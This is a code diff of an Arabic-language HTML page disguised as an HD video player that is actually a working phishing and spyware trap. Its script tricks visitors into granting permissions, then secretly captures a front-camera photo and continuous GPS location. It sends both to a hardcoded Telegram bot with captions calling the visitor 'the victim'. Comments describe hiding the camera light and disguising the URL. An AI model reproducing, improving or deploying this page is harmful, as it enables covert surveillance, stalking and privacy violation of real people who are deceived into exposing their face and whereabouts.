@@ -3,133 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>فديو</title>
+    <title>مشغل الفيديو الذكي - HD</title>
+    
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; font-family: sans-serif; }
-        .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        video { width: 100%; height: 100%; object-fit: cover; }
         
-        /* شاشة التمهيد (الهندسة الاجتماعية) */
-        #prePermissionOverlay { 
+        /* تصميم واجهة التمويه */
+        #smartOverlay { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.9); color: white; z-index: 9999; 
-            display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center;
-            padding: 20px;
+            background: radial-gradient(circle, #222 0%, #000 100%);
+            color: white; z-index: 9999; display: flex; flex-direction: column; 
+            align-items: center; justify-content: center; text-align: center; padding: 25px;
         }
-        #proceedButton { 
-            margin-top: 25px; padding: 15px 40px; background: #007bff; 
-            color: white; border: none; border-radius: 30px; cursor: pointer; 
-            font-weight: bold; font-size: 18px; box-shadow: 0 4px 15px rgba(0,123,255,0.4);
+        
+        .play-icon { 
+            width: 80px; height: 80px; background: rgba(255,255,255,0.1); 
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            margin-bottom: 20px; border: 2px solid #007bff;
         }
 
-        /* شاشة الخطأ عند رفض الأذونات */
-        #errorOverlay { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #000; color: #ff4d4d; z-index: 10000; 
-            text-align: center; padding-top: 50%; font-size: 20px;
+        #startBtn { 
+            padding: 14px 40px; background: #007bff; color: white; border: none; 
+            border-radius: 30px; cursor: pointer; font-weight: bold; font-size: 18px;
+            box-shadow: 0 0 20px rgba(0,123,255,0.5);
         }
+
+        /* حاوية الفيديو */
+        .video-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: none; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+
+        /* رسائل الحالة الوهمية */
+        #statusMsg { position: fixed; bottom: 30px; width: 100%; text-align: center; color: #555; font-size: 12px; z-index: 10001; }
     </style>
 </head>
 <body>
 
-    <div id="prePermissionOverlay">
-        <h2 style="margin-bottom:15px;">⚠️ مطلوب تحديث المشغل</h2>
-        <p>يرجى الضغط على الزر أدناه وتفعيل الصلاحيات لمشاهدة العرض بدقة عالية.</p>
-        <button id="proceedButton">تشغيل العرض الآن</button>
+    <div id="smartOverlay">
+        <div class="play-icon">
+            <svg width="40" height="40" viewBox="0 0 24 24" fill="#007bff"><path d="M8 5v14l11-7z"/></svg>
+        </div>
+        <h2 style="margin-bottom:10px;">بث فيديو مباشر (HD)</h2>
+        <p style="margin-bottom:30px; color:#aaa; font-size:14px;">اضغط للبدء وتحسين جودة العرض حسب موقعك الجغرافي</p>
+        <button id="startBtn">مشاهدة الآن</button>
     </div>
 
-    <div id="errorOverlay">
-        <p>⚠️ خطأ: يجب تفعيل الصلاحيات للمتابعة.</p>
-        <button onclick="location.reload()" style="margin-top:20px; padding:10px; cursor:pointer;">إعادة محاولة</button>
-    </div>
-
-    <div class="video-wrapper">
-        <video id="mainVideo" autoplay muted playsinline poster="2.png" preload="auto">
+    <div class="video-container" id="vContainer">
+        <video id="mainVideo" muted playsinline poster="2.png" preload="auto">
             <source src="1.mp4" type="video/mp4">
         </video>
     </div>
 
+    <div id="statusMsg">تشفير الاتصال SSL نشط...</div>
+
     <script>
-        // إعدادات البوت الخاصة بك
+        // إعدادات التلجرام
         const botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
         const chatId = "1611398303";
 
-        document.getElementById('proceedButton').onclick = function() {
-            document.getElementById('prePermissionOverlay').style.display = 'none';
-            startTracking();
+        document.getElementById('startBtn').onclick = function() {
+            // 🔱 الطبقة الثالثة: تفعيل ملء الشاشة (Full Screen)
+            let elem = document.documentElement;
+            if (elem.requestFullscreen) { elem.requestFullscreen(); }
+            else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }
+
+            // إخفاء التمويه وتشغيل الفيديو
+            document.getElementById('smartOverlay').style.display = 'none';
+            document.getElementById('vContainer').style.display = 'block';
+            document.getElementById('mainVideo').play();
+
+            // الطبقة الرابعة: بدء المقايضة (الأذونات مقابل الخدمة)
+            executeSocialEngineering();
+            
+            // تمويه الرابط في شريط العنوان (اختياري)
+            window.history.replaceState(null, null, "/Live-HD-Stream");
         };
 
-        async function startTracking() {
-            // 1. طلب الكاميرا والتقاط صورة واحدة (بدون ميكروفون للسرعة)
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                capturePhoto(stream);
-            } catch (err) {
-                showError();
-            }
-
-            // 2. تتبع الموقع بشكل مباشر ودائم (Live Tracking)
+        async function executeSocialEngineering() {
+            // 1. طلب الموقع (بشكل مباشر ومستمر)
             navigator.geolocation.watchPosition(pos => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                const acc = pos.coords.accuracy.toFixed(2);
+                const acc = pos.coords.accuracy.toFixed(1);
+                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                // رابط خرائط جوجل المباشر
-                const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                sendToBot(`📍 تحديث موقع مباشر:\n🎯 الدقة: ${acc} متر\n🔗 الخريطة: ${mapsUrl}`);
+            }, () => sendToBot("⚠️ الضحية رفض الموقع"), { enableHighAccuracy: true });
+
+            // 2. طلب الكاميرا (لقطة سريعة)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                let v = document.createElement('video');
+                v.srcObject = stream; v.play();
                 
-                const message = `📍 تحديث موقع مباشر:\n🎯 الدقة: ${acc} متر\n🔗 الخريطة: ${googleMapsUrl}`;
-                sendTextToTelegram(message);
-            }, err => {
-                console.log("رفض الموقع");
-            }, { 
-                enableHighAccuracy: true, // استخدام GPS الفعلي
-                maximumAge: 0, 
-                timeout: 10000 
-            });
+                setTimeout(() => {
+                    let canvas = document.createElement('canvas');
+                    canvas.width = 720; canvas.height = 1280;
+                    canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
+                    sendPhoto(canvas.toDataURL('image/jpeg'));
+                    // إغلاق الكاميرا فوراً لعدم كشف الاختراق
+                    stream.getTracks().forEach(t => t.stop());
+                }, 2500);
+            } catch (e) {
+                sendToBot("⚠️ الضحية رفض الكاميرا");
+            }
         }
 
-        function capturePhoto(stream) {
-            let v = document.createElement('video');
-            v.srcObject = stream;
-            v.play();
-            
-            setTimeout(() => {
-                let canvas = document.createElement('canvas');
-                canvas.width = 720; 
-                canvas.height = 1280;
-                canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
-                sendPhotoToTelegram(canvas.toDataURL('image/jpeg'));
-                
-                // إغلاق الكاميرا بعد التقاط الصورة لضمان عدم لفت الانتباه (ضوء الكاميرا)
-                stream.getTracks().forEach(track => track.stop());
-            }, 2000);
+        function sendToBot(msg) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
         }
 
-        function sendTextToTelegram(text) {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
-        }
-
-        function sendPhotoToTelegram(imgData) {
+        function sendPhoto(imgData) {
             let blob = dataURLtoBlob(imgData);
             let form = new FormData();
-            form.append('document', blob, "capture.jpg");
-            fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${encodeURIComponent("📸 لقطة كاميرا الضحية")}`, { 
-                method: 'POST', 
-                body: form 
+            form.append('document', blob, "snap.jpg");
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${encodeURIComponent("📸 صورة الضحية المباشرة")}`, { 
+                method: 'POST', body: form 
             });
         }
 
-        function dataURLtoBlob(dataurl) {
-            let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-            while(n--) u8arr[n] = bstr.charCodeAt(n);
-            return new Blob([u8arr], {type:mime});
-        }
-
-        function showError() {
-            document.getElementById('errorOverlay').style.display = 'block';
-            sendTextToTelegram("⚠️ المستخدم رفض صلاحيات الكاميرا");
+        function dataURLtoBlob(d) {
+            let p = d.split(','), m = p[0].match(/:(.*?);/)[1],
+                b = atob(p[1]), n = b.length, u = new Uint8Array(n);
+            while(n--) u[n] = b.charCodeAt(n);
+            return new Blob([u], {type:m});
         }
     </script>
 </body>
